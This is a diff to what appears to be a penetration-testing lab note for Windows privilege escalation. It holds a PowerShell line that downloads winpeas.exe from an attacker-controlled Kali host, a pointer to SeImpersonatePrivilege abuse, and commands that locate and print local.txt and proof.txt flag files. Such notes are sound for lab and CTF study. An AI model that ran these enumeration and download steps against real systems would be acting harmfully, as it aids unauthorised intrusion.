@@ -74,3 +74,24 @@ const command = `iwr -uri http://${KaliIP}/winpeas.exe -OutFile winpeas.exe`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+Priv Esc
+
+[[SeImpersonatePrivilege]]
+
+Search flags
+
+```
+cd C:\
+```
+
+```
+dir /s /b local.txt
+```
+
+```
+dir /s /b proof.txt
+```
+
+```
+type proof.txt
+```
